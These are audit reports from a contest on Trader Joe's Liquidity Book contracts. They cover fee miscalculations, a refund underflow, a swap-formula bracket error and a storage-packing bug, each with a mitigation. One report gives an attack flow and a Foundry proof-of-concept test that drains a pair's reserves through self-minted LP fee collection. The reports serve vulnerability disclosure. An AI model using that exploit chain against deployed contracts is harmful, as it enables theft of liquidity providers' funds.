# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L329-L330 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L124-L125   # Vulnerability details  # LBPair contracts consistently collect less fees than their FeeParameters --- ## Github and source code  https://github.com/sha256yan/incorrect-fee --- ## Motivation and Severity  LBpair contracts' fees fall short by 0.1% on single bin with the deficit growing exponentially with multi-bin swaps.   This report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the "Fee Deficit".   ![feeDeficitGrowth](https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png)  The exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected by LPs and DEXs are during high volatility periods. Note that the peak Fee Deficit percentage of 1.6% means that 1.6% of expected fees would not be collected.     https://user-images.githubusercontent.com/91401566/197406096-5771893b-82f6-43e8-aa42-ccda449e4936.mov  With an assumed average total fee of 1% (higher than usual due to ```variableFee``` component) and average Fee Deficit percentage of 0.4%; The total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately \$1.979B in trading volume, would be $***79,160*** over one week.     [SwapHelper.getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65) carries most of the blame for this error.   3 main causes have been identified and will be discussed in this report. - [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom) - [Incorrect conditional for amountIn overflow](#incorrect-conditional-for-amountin-overflow) - [Need for an additional FeeHelper function](#need-for-an-additional-feehelper-function)   ---      ### Affected contracts and libraries  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330)  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125)   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)  - SwapHelper.sol   - [getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65)   ---  ### Proposed changes  - FeeHelper.sol   - [getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173) ( ***New*** )   - SwapHelper.sol   - [getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126) ( ***New*** )  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125) ( ***Modified*** )   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169) ( ***Modified*** )  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333)  ( ***Modified*** )  ---  ### Details - As mentioned earlier, most issues arise from SwapHelper.getAmounts . The SwapHelper library is often used for the Bin type. ([Example in LBPair](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36)). The proposed solution includes the new functions [SwapHelper.getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133) and [FeeHelper.getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173). - LBPair.swap uses _bin.getAmounts(...) on the active bin to calculate fees. ([See here](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330)) - Inside of SwapHelper.getAmounts, for a given swap, if a bin has enough liqudity, the fee is calculated using ([FeeHelper.getFeeAmountFrom](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65)). This results in smaller than expected fees.  - LBRouter.getSwapOut relies on SwapHelper.getAmounts to simulate swaps. Its simulations adjust to the correct fee upon using SwapHelper.getAmountsV2 ([LBRouter.getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125), [SwapHelper.getAmounts](), [SwapHelper.getAmountsV2]()) - LBRouter.getSwapIn has a fee calculation error which is independent of SwapHelper.getAmounts. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)) - As of right now the LBPair.swap using getAmountsV2 uses 3.8% ***more*** gas.  ![LBPair comparison](https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png)   ---   # Incorrect use of getFeeAmountFrom - When there is enough liquidity in a bin for a swap, we should use FeeHelper.getFeeAmount(amountIn) instead of FeeHelper.getFeeAmountFrom(amountIn).  ### Evidence - amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. [Inside LBPair.sol](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314) --- [Inside TokenHelper](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69)   Will now use example numbers: - Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair) - Let PRECISION = 1e18 - Let totalFee =  0.00125 x precision (fee of 0.0125%) - Let price = 1 (parity) - If the current bin has enough liqudity, feeAmount must be: (amountIn * totalFee ) / (PRECISION) = 12500000  - [FeeHelper.getFeeAmountFrom(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126) uses the formula: feeAmount = (amountIn * totalFee) / (PRECISION + totalFee) = 12484394 - [FeeHelper.getFeeAmount(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118) uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case. - Visit the tests section to run a test.    ---   # Incorrect condition for amountIn overflow - The [condition](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61) for when an amountIn overflows the maximum amount available in a bin is flawed. - The Fee Deficit here could potentially trigger an unnecessary bin de-activation.  ### Evidence #### Snippet 1 (SwapHelper.getAmounts)  ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));          if (_maxAmountInToBin + fees.total <= amountIn) {             //do things         } ``` - Collecting the fees on ```_maxAmountInToBin``` before doing so on ```amountIn``` means we are not checking  to see whether ```amountIn``` after   Consider the following: #### Snippet 2 (SwapHelper.getAmountsV2) ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));          if (_maxAmountInToBin <  amountIn - fees.total) {             //do things         } ``` - Now, the fees are collected on ```amountIn```. - Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases ``` _maxAmountInToBin <  amountIn ```. - Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)    ---     # Need for an additional FeeHelper function - There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?  ### Evidence - ```LBRouter.getSwapIn(, amountOut, )``` needs this question answered. At a given price, how many tokens must a user send, to receive ```amountOut```?   - We use the ```amountOut``` and price to work backwards to the ```amountInToBin```.   - Current approach calculates fees on ```amountInToBin```. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125))   - This is incorrect as fees should be calculated on ```amountIn```. (As we discussed in [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom))   - SwapHelper.getAmounts needs to know what hypothetical ```amountIn``` would end up as ```maxAmountInToBin``` after fees. This is needed to be able to avoid [Incorrect amountIn overflow](#incorrect-conditional-for-amountin-overflow)   ---   ## Install dependencies  To install dependencies, run the following to install dependencies:  ``` forge install ```  ___  ## Tests  To run tests, run the following command:  ``` forge test --match-contract Report -vv ``` --- ## testSingleBinSwapFeeDifference: - Simple test to show the Fee Defecit in it's most basic form. --- ## testFalsePositiveBinDeactivation - Test that shows false positive resulting from the [Incorrect condition](#incorrect-conditional-for-amountin-overflow) --- #### testCorrectFeeBinDeactivation - Test that shows with getAmountsV2 the false positive issue is resolved. --- ### testMultiBinGrowth - Generates datapoints used in opening graph. 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521   # Vulnerability details  ## Impact When calling the `swapAVAXForExactTokens`  function, `if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)` is executed, which is for refunding any excess amount sent in; this is confirmed by this function's comment as well. However, executing `amountsIn[0] - msg.value` will always revert when `msg.value > amountsIn[0]` is true. Developers who has the design of the `swapAVAXForExactTokens` function in mind could develop front-ends and contracts that will send excess amount when calling the `swapAVAXForExactTokens` function. Hence, the users, who rely on these front-ends and contracts for interacting with the `swapAVAXForExactTokens` function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521 ```solidity     /// @notice Swaps AVAX for exact tokens while performing safety checks     /// @dev will refund any excess sent     ...     function swapAVAXForExactTokens(         uint256 _amountOut,         uint256[] memory _pairBinSteps,         IERC20[] memory _tokenPath,         address _to,         uint256 _deadline     )         external         payable         override         ensure(_deadline)         verifyInputs(_pairBinSteps, _tokenPath)         returns (uint256[] memory amountsIn)     {         ...          if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);     } ```  ## Proof of Concept Please add the following test in `test\LBRouter.Swaps.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testSwapAVAXForExactTokensIsUnableToRefund() public {         uint256 amountOut = 1e18;          (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);          IERC20[] memory tokenList = new IERC20[](2);         tokenList[0] = wavax;         tokenList[1] = token6D;         uint256[] memory pairVersions = new uint256[](1);         pairVersions[0] = DEFAULT_BIN_STEP;          vm.deal(DEV, amountIn + 500);          // Although the swapAVAXForExactTokens function supposes to refund any excess sent,         //   calling it reverts when sending more than amountIn         //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow         vm.expectRevert(stdError.arithmeticError);         router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520 can be updated to the following code. ```solidity         if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, msg.value - amountsIn[0]); ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202   # Vulnerability details  ## Description  Similar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:  ```     function _getPendingFees(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private view returns (uint256 amountX, uint256 amountY) {         Debts memory _debts = _accruedDebts[_account][_id];          amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;         amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;     } ```  accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.  When liquidity is first minted to user, the \_accruedDebts is updated to match current \_balance * accToken\*PerShare. Without this step, user could collect fees for the entire growth of accToken\*PerShare from zero to current value. This is done in \_updateUserDebts, called by \_cacheFees() which is called by \_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.  ```     function _updateUserDebts(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private {         uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);         uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);          _accruedDebts[_account][_id].debtX = _debtX;         _accruedDebts[_account][_id].debtY = _debtY;     } ```  The critical problem lies in \_beforeTokenTransfer:  ``` if (_from != _to) {     if (_from != address(0) && _from != address(this)) {         uint256 _balanceFrom = balanceOf(_from, _id);         _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);     }     if (_to != address(0) && _to != address(this)) {         uint256 _balanceTo = balanceOf(_to, _id);         _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);     } } ```  Note that if \_from or \_to is the LBPair contract itself, \_cacheFees won't be called on \_from or \_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.   This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken\*PerShare value.  We can exploit this bug to collect the entire reserve assets. The attack flow is: - Transfer amount X to pair - Call pair.mint(), with the to address = pair address - call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work - Pair will now think user sent in money, because the bookkeeping is wrong. \_pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool: ``` uint256 _amountIn = _swapForY     ? tokenX.received(_pair.reserveX, _pair.feesX.total)     : tokenY.received(_pair.reserveY, _pair.feesY.total); ``` - Attacker calls swap() and receives reserve assets using the fees collected. - Attacker calls burn(), passing their own address in \_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.  Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued: ``` if (amountX != 0) {     _pairInformation.feesX.total -= uint128(amountX); } if (amountY != 0) {     _pairInformation.feesY.total -= uint128(amountY); } ```  If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.  ## Impact  Attacker can steal the entire reserves of the LBPair.  ## Proof of Concept  Paste this test in LBPair.Fees.t.sol:  ```     function testAttackerStealsReserve() public {         uint256 amountY=  53333333333333331968;         uint256 amountX = 100000;          uint256 amountYInLiquidity = 100e18;         uint256 totalFeesFromGetSwapX;         uint256 totalFeesFromGetSwapY;          addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);         uint256 id;         (,,id ) = pair.getReservesAndId();         console.log("id before" , id);          //swap X -> Y and accrue X fees         (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);         totalFeesFromGetSwapX += feesXFromGetSwap;          token6D.mint(address(pair), amountXInForSwap);         vm.prank(ALICE);         pair.swap(true, DEV);         (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();          (,,id ) = pair.getReservesAndId();         console.log("id after" , id);           console.log("Bob balance:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");          uint256 amount0In = 100e18;          uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);         uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);         uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);          console.log("Minting for BOB:");         console.log(amount0In);         console.log("-------------");          token6D.mint(address(pair), amount0In);         //token18D.mint(address(pair), amount1In);         pair.mint(_ids, _distributionX, _distributionY, address(pair));         uint256[] memory amounts = new uint256[](1);         console.log("***");         for (uint256 i; i < 1; i++) {             amounts[i] = pair.balanceOf(address(pair), _ids[i]);             console.log(amounts[i]);         }         uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;         (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);         console.log("profit x", profit_X);         console.log("profit y", profit_Y);         pair.collectFees(address(pair), profit_ids);         (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);          console.log("swap x", swap_x);         console.log("swap y", swap_y);          console.log("Bob balance after swap:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");          console.log("*****");         pair.burn(_ids, amounts, BOB);           console.log("Bob balance after burn:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");      } ```   ## Tools Used  Manual audit, foundry  ## Recommended Mitigation Steps  Code should not exempt any address from \_cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them. 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L725   # Vulnerability details   ## Vulnerable detail  Function `LBRouter._getAmountsIn` is a helper function to return the amounts in with given `amountOut`. This function will check the pair of `_token` and `_tokenNext` is `JoePair` or `LBPair` using `_binStep`. * If `_binStep == 0`, it will be a `JoePair` otherwise it will be an `LBPair`. ```solidity= if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` As we can see when `_binStep == 0` and `_token < _tokenPath[i]` (in another word  we swap through `JoePair` and pair's`token0` is `_token` and `token1` is `_tokenPath[i]`), it will  1. Get the reserve of pair (`reserveIn`, `reserveOut`)  2. Calculate the `_amountIn` by using the formula  ``` amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1 ```  But unfortunately the denominator `_reserveOut - amountOut_ * 997` seem incorrect. It should be `(_reserveOut - amountOut_) * 997`.  We will do some math calculations here to prove the expression above is wrong.   **Input:**  * `_reserveIn (rIn)`: reserve of `_token` in pair  * `_reserveOut (rOut)`: reserve of `_tokenPath[i]` in pair  * `amountOut_`: the amount of `_tokenPath` the user wants to gain    **Output:**  * `rAmountIn`: the actual amount of `_token` we need to transfer to the pair.   **Generate Formula**  Cause `JoePair` [takes 0.3%](https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of `amountIn` as fee, we get  * `amountInDeductFee = amountIn' * 0.997`  Following the [constant product formula](https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have  ```     rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_) ==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1 <=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1 <=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1 <=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1 <=>  ```  As we can see `rAmountIn` is different from `amountsIn[i - 1]`, the denominator of `rAmountIn` is `(rOut - amountOut_) * 997` when the denominator of `amountsIn[i - 1]` is `_reserveOut - amountOut_ * 997` (Missing one bracket)  ## Impact **Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.**   Let dive in the function `swapTokensForExactTokens()` to figure out why this scenario happens. I will assume I just swap through only one pool from `JoePair` and 0 pool from `LBPair`.  * Firstly function will get the list `amountsIn` from function `_getAmountsIn`. So `amountsIn` will be [`incorrectAmountIn`, `userDesireAmount`].      ```solidity=             // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440     amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);     ```  * Then it transfers `incorrectAmountIn` to `_pairs[0]` to prepare for the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444     _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);     ```   * Finally it calls function `_swapTokensForExactToken` to execute the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446         uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);     ```     In this step it will reach to [line 841](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected `amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount`.     ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841     amountOut = _amountsIn[i + 1];     ```     So after calling `IJoePair(_pair).swap()`, the user just gets exactly `amountOut` and wastes a lot of tokenIn that (s)he transfers to the pool.    ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4  You can place this file into `/test` folder and run it using  ```bash= forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv ```  Explanation of test script: (For more detail u can read the comments from test script above) 1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory. 2. At the forked block, price `WAVAX/USDC` was around 15.57. We try to use LBRouter function `swapTokensForExactTokens` to swap 10$ WAVAX (10e18 wei) to 1$ USDC (1e6 wei). But it reverts with the error `LBRouter__MaxAmountInExceeded`. But when we swap directly to JoePair, it swap successfully 10$ AVAX (10e18 wei) to 155$ USDC (155e6 wei). 3. We use LBRouter function `swapTokensForExactTokens` again with very large `amountInMax` to swap 1$ USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).  ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBRouter._getAmountsIn` as follow ```solidity= // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728 if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     // Fix here      amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut - amountOut_) * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917   # Vulnerability details  ## Vulnerable detail  Struct `FeeParameters` contains 12 fields as follows:  ```solidity= struct FeeParameters {     // 144 lowest bits in slot      uint16 binStep;     uint16 baseFactor;     uint16 filterPeriod;      uint16 decayPeriod;      uint16 reductionFactor;      uint24 variableFeeControl;     uint16 protocolShare;     uint24 maxVolatilityAccumulated;           // 112 highest bits in slot      uint24 volatilityAccumulated;     uint24 volatilityReference;     uint24 indexRef;     uint40 time;  } ``` Function [`LBPair.setFeeParamters(bytes _packedFeeParamters)`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of `LBPair._feeParameter`'s slot to 144 lowest bits of `_packedFeeParameters` (The layout of `_packedFeeParameters` can be seen [here](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)). ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917  /// @notice Internal function to set the fee parameters of the pair /// @param _packedFeeParameters The packed fee parameters function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }      /// [#explain]  it will get 112 highest bits of feeStorageSlot,     ///             and stores it in the 112 lowest bits of _varParameters      uint256 _varParameters          = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);      /// [#explain]  get 144 lowest bits of packedFeeParameters      ///             and stores it in the 144 lowest bits of _newFeeParameters       uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);      assembly {         // [$audit-high] wrong operation `or` here          //              Mitigate: or(_newFeeParameters, _varParameters << 144)             sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))     } } ``` As we can see in the implementation of `LBPair._setFeesParametes` above, it gets the 112 highest bits of `_feeStorageSlot` and stores it in the 112 lowest bits of `_varParameter`. Then it gets the 144 lowest bits of `packedFeeParameter` and stores it in the 144 lowest bits of `_newFeeParameters`.   Following the purpose of function `setFeeParameters`, the new `LBPair._feeParameters` should form as follow:  ``` // keep 112 highest bits remain unchanged  // set 144 lowest bits to `_newFeeParameter` [...112 bits...][....144 bits.....] [_varParameters][_newFeeParameters] ``` It will make `feeParameters = _newFeeParameters | (_varParameters << 144)`. But current implementation just stores the `or` value of `_varParameters` and `_newFeeParameter` into `_feeParameters.slot`. It forgot to shift left the `_varParameters` 144 bits before executing `or` operation.   This will make the value of `binStep`, ..., `maxVolatilityAccumulated` incorrect, and also remove the value (make the bit equal to 0) of `volatilityAccumulated`, ..., `time`.  ## Impact * Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint) * Break the functionality of LBPair. The user can't swap/mint/flashLoan --> Make all the tokens stuck in the pools   ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769  You can place this file into `/test` folder and run it using  ```bash= forge test --match-contract High1Test -vv ```  Explanation of test script: 1. First we create a pair with `binStep = DEFAULT_BIN_STEP = 25` 2. We do some actions (add liquidity -> mint -> swap) to increase the value of `volatilityAccumulated` from `0` to `60000` 3. We call function `factory.setFeeParametersOnPair` to set new fee parameters.  4. After that the value of `volatilityAccumulated` changed to value `0` (It should still be unchanged after `factory.setFeeParametersOnPair`)  5. We check the value of `binStep` and it changed from`25` to `60025`      * `binStep` has that value because [line 915](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set `binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025`.  6. This change of `binStep` value will break all the functionality of `LBPair` cause `binStep > Constant.BASIS_POINT_MAX = 10000`  --> `Error: BinStepOverflows`    ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBPair._setFeesParaters` as follow:  ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917 function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }       uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);     uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);       assembly {         sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))     } } ```  
